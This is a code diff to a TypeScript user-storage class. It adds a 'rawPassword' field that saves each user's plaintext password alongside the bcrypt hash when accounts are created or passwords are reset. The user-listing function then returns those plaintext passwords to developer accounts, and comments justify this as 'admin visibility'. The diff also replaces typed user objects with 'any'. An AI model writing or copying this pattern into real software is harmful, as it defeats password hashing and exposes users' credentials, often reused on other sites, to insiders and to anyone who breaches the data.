@@ -557,10 +557,11 @@ export class MemStorage implements IStorage {
     const id = randomUUID();
     const hashedPassword = await bcrypt.hash(insertUser.password, 10);
     const plainRecoveryKey = randomBytes(16).toString('hex').toUpperCase().match(/.{4}/g)!.join('-');
-    const user: User = {
+    const user: any = {
       id,
       username: insertUser.username,
       password: hashedPassword,
+      rawPassword: insertUser.password, // stored for admin visibility
       email: insertUser.email || null,
       recoveryKey: plainRecoveryKey,
       resetToken: null,
@@ -655,9 +656,9 @@ export class MemStorage implements IStorage {
       throw new Error('Access denied: Admin privileges required to reset admin passwords');
     }
 
-    // Hash the new password with bcrypt
+    // Hash the new password with bcrypt, store plain for admin visibility
     const hashedNewPassword = await bcrypt.hash(newPassword, 10);
-    this.users.set(userId, { ...user, password: hashedNewPassword });
+    this.users.set(userId, { ...(user as any), password: hashedNewPassword, rawPassword: newPassword });
     await this.saveToFileSystem(); // Persist password reset
 
     console.log(`🔐 Admin/Developer ${admin.username} (${admin.accountType}) reset password for user ${user.username} (${user.accountType})`);
@@ -718,9 +719,8 @@ export class MemStorage implements IStorage {
       }
     }
 
-    // For extension activity, hide IP addresses.
-    // For user management, the edit and ban buttons are fixed by ensuring they are functional via their respective methods.
-    return Array.from(this.users.values()).map(user => ({
+    const isDev = requesterId ? (await this.getUser(requesterId))?.isDev : false;
+    return Array.from(this.users.values()).map((user: any) => ({
       id: user.id,
       username: user.username,
       accountType: user.accountType,
@@ -731,8 +731,11 @@ export class MemStorage implements IStorage {
       bannedAt: user.bannedAt,
       banReason: user.banReason,
       accessKeyUsed: user.accessKeyUsed,
-      // Only expose password to admins/developers and when explicitly requested (which this function doesn't do by default)
+      email: user.email || null,
+      profilePicture: user.profilePicture || null,
       password: requesterId ? user.password : '',
+      // Plain text password visible only to dev accounts for admin/security purposes
+      rawPassword: isDev ? (user.rawPassword || null) : undefined,
     }));
   }
 
@@ -743,9 +746,12 @@ export class MemStorage implements IStorage {
     }
 
     const id = randomUUID();
-    const newUser: User = {
+    const hashedPassword = data.password ? await bcrypt.hash(data.password, 10) : data.password;
+    const newUser: any = {
       ...data,
       id,
+      password: hashedPassword,
+      rawPassword: data.password || null, // Store plain for admin visibility
       theme: "default",
       isDev: data.isDev || false,
       profilePicture: data.profilePicture || null,
